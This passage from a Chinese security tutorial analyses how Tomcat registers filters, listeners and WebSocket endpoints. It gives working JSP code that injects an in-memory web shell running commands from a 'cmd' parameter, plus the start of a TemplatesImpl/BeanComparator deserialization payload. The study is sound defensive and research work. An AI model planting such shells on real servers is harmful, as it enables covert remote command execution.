&#125;;</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filter);</span><br><span class="line">    filterDef.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br><span class="line">    filterConfigs.put(<span class="string">&quot;evilFilter&quot;</span>, filterConfig);</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setFilterName(<span class="string">&quot;evilFilter&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMap(filterMap);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Listener-型内存马"><a href="#Tomcat-Listener-型内存马" class="headerlink" title="Tomcat-Listener 型内存马"></a>Tomcat-Listener 型内存马</h3><h4 id="流程分析-2"><a href="#流程分析-2" class="headerlink" title="流程分析"></a>流程分析</h4><p>编写一个简单的HelloListener：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"></span><br><span class="line"><span class="meta">@WebListener(value = &quot;/hello-servlet&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request destroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;request initialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Listener分多种，ServletRequestListener访问服务时触发。同样，在下图位置打下断点，分析调用栈：</p><p><img src="https://pic.imgdb.cn/item/64d26f2b1ddac507cc0866e5.jpg" alt="image-20230803163546389"></p><p>进入<code>org.apache.catalina.core.StandardContext#fireRequestInitEvent</code>：</p><p><img src="https://pic.imgdb.cn/item/64d26f3b1ddac507cc088ea1.jpg"></p><p>其中listener的定义如下：</p><p><img src="https://pic.imgdb.cn/item/64d26f461ddac507cc08a99b.jpg" alt="image-20230803163747713"></p><p>可以看到listener是把instance进行强转之后得到的。而instance是instances数组中的一个元素，我们看看instances是怎么来的：</p><p><img src="https://pic.imgdb.cn/item/64d26f521ddac507cc08c84f.jpg" alt="image-20230803163815234"></p><p>跟进<code>org.apache.catalina.core.StandardContext#getApplicationEventListeners</code>：</p><p><img src="https://pic.imgdb.cn/item/64d26f5e1ddac507cc08e61c.jpg" alt="image-20230803163938618"></p><p>我们发现instances是把<code>applicationEventListenersList</code>转为数组得到的，在<code>org.apache.catalina.core.StandardContext#addApplicationEventListener</code>发现<code>applicationEventListenersList</code>的元素是如何添加的：</p><p><img src="https://pic.imgdb.cn/item/64d26f681ddac507cc090196.jpg" alt="image-20230803164109053"></p><p>因此注入Listener内存马的方法就很简单了。获取到StandardContext后直接调用addApplicationEventListener方法传入要注入的Listener即可。</p><h4 id="反序列化注入Tomcat-Listener-型内存马"><a href="#反序列化注入Tomcat-Listener-型内存马" class="headerlink" title="反序列化注入Tomcat-Listener 型内存马"></a>反序列化注入Tomcat-Listener 型内存马</h4><p>过于简单，交给读者完成。（其实是我实在懒得写了，嘻嘻～）</p><h4 id="jsp注入Tomcat-Listener-型内存马"><a href="#jsp注入Tomcat-Listener-型内存马" class="headerlink" title="jsp注入Tomcat-Listener 型内存马"></a>jsp注入Tomcat-Listener 型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Response&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.ApplicationContext&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">                <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="keyword">if</span> (request.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                        isLinux = <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, request.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                    response.getWriter().write(output);</span><br><span class="line">                    response.getWriter().flush();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getServletContext();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">applicationContextFiled</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    applicationContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) applicationContextFiled.get(servletContext);</span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextFiled</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextFiled.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextFiled.get(applicationContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    standardContext.addApplicationEventListener(evilListener);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Tomcat-Websocket-型内存马"><a href="#Tomcat-Websocket-型内存马" class="headerlink" title="Tomcat-Websocket 型内存马"></a>Tomcat-Websocket 型内存马</h3><p>WebSocket是一种全双工通信协议，即客户端可以向服务端发送请求，服务端也可以主动向客户端推送数据。这样的特点，使得它在一些实时性要求比较高的场景效果斐然（比如微信朋友圈实时通知、在线协同编辑等）。主流浏览器以及一些常见服务端通信框架（Tomcat、netty、undertow、webLogic等）都对WebSocket进行了技术支持。</p><h4 id="流程分析-3"><a href="#流程分析-3" class="headerlink" title="流程分析"></a>流程分析</h4><p>导入依赖，应与自己的Tomcat版本一致：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">  &lt;groupId&gt;org.apache.tomcat&lt;/groupId&gt;</span><br><span class="line">  &lt;artifactId&gt;tomcat-websocket&lt;/artifactId&gt;</span><br><span class="line">  &lt;version&gt;9.0.76&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure><p>以下是一个简单的Tomcat-Websocket样例：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.*;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(Session session, EndpointConfig endpointConfig)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="keyword">new</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt;() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String message)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;Receice message: &quot;</span>+message);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">        System.out.println(<span class="string">&quot;Websocket: &quot;</span> + session.toString());</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            session.getBasicRemote().sendText(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClose</span><span class="params">(Session session, CloseReason closeReason)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Close!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onError</span><span class="params">(Session session, Throwable throwable)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Error!!!&quot;</span>);</span><br><span class="line">        throwable.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.tomcatservletmemshell;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerApplicationConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.util.HashSet;</span><br><span class="line"><span class="keyword">import</span> java.util.Set;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EndpointApplicationConfig</span> <span class="keyword">implements</span> <span class="title class_">ServerApplicationConfig</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;ServerEndpointConfig&gt; <span class="title function_">getEndpointConfigs</span><span class="params">(Set&lt;Class&lt;? extends Endpoint&gt;&gt; set)</span> &#123;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        Set&lt;ServerEndpointConfig&gt; result = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (set.contains(HelloWebsocket.class)) &#123;</span><br><span class="line">            result.add(ServerEndpointConfig.Builder.create(HelloWebsocket.class, <span class="string">&quot;/websocket&quot;</span>).build());</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Set&lt;Class&lt;?&gt;&gt; getAnnotatedEndpointClasses(Set&lt;Class&lt;?&gt;&gt; set) &#123;</span><br><span class="line">        System.out.println(set);</span><br><span class="line">        <span class="keyword">return</span> set;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后可以用以下python代码连接：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/websocket&quot;</span>)</span><br><span class="line">ws.send(<span class="string">&quot;HELLO&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(ws.recv())</span><br><span class="line">ws.close()</span><br></pre></td></tr></table></figure><p>在了解Tomcat-Websocket的加载之前，需要先了解一下Tomcat的SCI机制。这里贴一篇关于SCI机制的文章吧：<a href="https://blog.csdn.net/lqzkcx3/article/details/78507169">https://blog.csdn.net/lqzkcx3/article/details/78507169</a></p><blockquote><ol><li><p>ServletContainerInitializer接口的实现类通过java SPI声明自己是ServletContainerInitializer 的provider.</p></li><li><p>容器启动阶段依据java spi获取到所有ServletContainerInitializer的实现类，然后执行其onStartup方法.</p></li><li><p>另外在实现ServletContainerInitializer时还可以通过@HandlesTypes注解定义本实现类希望处理的类型，容器会将当前应用中所有这一类型（继承或者实现）的类放在ServletContainerInitializer接口的集合参数c中传递进来。如果不定义处理类型，或者应用中不存在相应的实现类，则集合参数c为空.</p></li><li><p>这一类实现了 SCI 的接口，如果做为独立的包发布，在打包时，会在JAR 文件的 META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer 文件中进行注册。 容器在启动时，就会扫描所有带有这些注册信息的类(@HandlesTypes(WebApplicationInitializer.class)这里就是加载WebApplicationInitializer.class类)进行解析，启动时会调用其 onStartup方法——也就是说servlet容器负责加载这些指定类, 而ServletContainerInitializer的实现者(例如Spring-web中的SpringServletContainerInitializer对接口ServletContainerInitializer的实现中,是可以直接获取到这些类的)</p></li></ol></blockquote><p>大致意思就是说在Tomcat启动的时候，将会对classpath下的jar进行扫描，扫描包中的META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer文件，对其中提到的类进行加载，调用这个类的onStartup方法。那么我们来看一下tomcat-websocket.jar中的META-INF&#x2F;services&#x2F;javax.servlet.ServletContainerInitializer文件：</p><p><img src="https://pic.imgdb.cn/item/64d26f761ddac507cc092ce8.jpg" alt="image-20230803185757146"></p><p>接下来我们在org.apache.tomcat.websocket.server.WsSci#onStartup下打断点：</p><p><img src="https://pic.imgdb.cn/item/64d26f841ddac507cc095024.jpg" alt="image-20230803185916462"></p><p>首先调用<code>init</code>进行初始化操作WsServerContainer对象，跟进一下init方法：</p><p><img src="https://pic.imgdb.cn/item/64d26f8f1ddac507cc096c47.jpg" alt="image-20230804000010834"></p><p>创建了一个WsServerContainer对象sc，参数为servletContext对象。之后调用servletContext的setAttribute()方法，将servletContext的<code>javax.websocket.server.ServerContainer</code>属性设置为sc，并添加了两个listener，一个是WsSessionListener，一个是WsContextListener。添加WsSessionListener的作用是当http的session销毁时同样销毁掉websocket session：</p><p><img src="https://pic.imgdb.cn/item/64d26f9b1ddac507cc09893d.jpg"></p><p>不过因为我们是注入内存马，只需要了解注册过程即可，并不需要太注意它的作用。之后将一个<code>ServerEndpointConfig</code>对象传给了sc的<code>addEndpoint</code>方法：</p><p><img src="https://pic.imgdb.cn/item/64d26fa71ddac507cc09a55b.jpg" alt="image-20230804000414760"></p><p>跟进一下这个addEndpoint方法，这里获取到 path：</p><p><img src="https://pic.imgdb.cn/item/64d26fc81ddac507cc09f576.jpg" alt="image-20230804000617613"></p><p>在取出了其中配置的路由之后生成了一个mapping映射：</p><p><img src="https://pic.imgdb.cn/item/64d26fd21ddac507cc0a1256.jpg" alt="image-20230804000745093"></p><p>接下来总结一下注入流程：</p><p>1.创建一个恶意的Endpoint，实现MessageHandler接口，重写onMessage方法。</p><p>2.为该Endpoint创建ServerEndpointConfig。</p><p>3.获取servletContext的<code>javax.websocket.server.ServerContainer</code>属性得到WsServerContainer</p><p>4.通过<code>WsServerContainer.addEndpoint</code>添加ServerEndpointConfig</p><h4 id="反序列化注入-Tomcat-Websocket-型内存马"><a href="#反序列化注入-Tomcat-Websocket-型内存马" class="headerlink" title="反序列化注入 Tomcat-Websocket 型内存马"></a>反序列化注入 Tomcat-Websocket 型内存马</h4><p>回想一下，我们之前是怎样创建一个恶意的Filter对象或者一个恶意的Servlet对象的？我们是直接让TemplatesImpl对象的_bytecodes字段所对应的那个类实现了Filter接口或Servlet接口，但是现在我们不能继续通过这样的方式来生成一个恶意的Endpoint了。因为这个类必需要继承AbstractTranslet，因此就无法再继承Endpoint了。那我们还有什么办法吗？当然是通过ClassLoader的defineClass来向JVM中注册一个恶意的Endpoint了。我们可以通过<code>Thread.*currentThread*().getContextClassLoader()</code>来获取ClassLoader，之后通过反射的方法，执行defineClass方法，将我们设置好的byte数组转变为java类。具体请看以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.beanutils.BeanComparator;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String fieldName, Object value)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(fieldName);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Field <span class="title function_">getField</span><span class="params">(<span class="keyword">final</span> Class&lt;?&gt; clazz, <span class="keyword">final</span> String fieldName)</span> &#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            field = clazz.getDeclaredField(fieldName);</span><br><span class="line">            field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (NoSuchFieldException ex) &#123;</span><br><span class="line">            <span class="keyword">if</span> (clazz.getSuperclass() != <span class="literal">null</span>)</span><br><span class="line">                field = getField(clazz.getSuperclass(), fieldName);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> field;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getpayload</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">obj</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;</span><br><span class="line">                ClassPool.getDefault().get(WebsocketTemplatesImpl.class.getName()).toBytecode()</span><br><span class="line">        &#125;);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;HelloTemplatesImpl&quot;</span>);</span><br><span class="line">        setFieldValue(obj, <span class="string">&quot;_tfactory&quot;</span>, <span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line"></span><br><span class="line">        <span class="keyword">final</span> <span class="type">BeanComparator</span> <span 